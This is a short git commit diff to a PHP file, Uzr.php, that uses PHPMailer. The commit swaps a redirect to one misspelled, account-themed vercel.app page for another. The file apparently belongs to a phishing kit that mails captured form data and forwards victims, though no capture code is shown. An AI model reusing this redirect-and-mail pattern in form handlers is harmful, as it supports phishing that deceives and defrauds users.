2bbee0ec8894b12b6db3336edb6dc9b81b8e2dcc
Ghaliya3399 <ghaliyaaliyounisaneza@gmail.com>
2025-08-31 15:55:59 +0500

    Update Uzr.php

--- Uzr.php
+++ Uzr.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://page-contact-account-infe.vercel.app/");
+header("Location: https://team-submit-counr-info.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
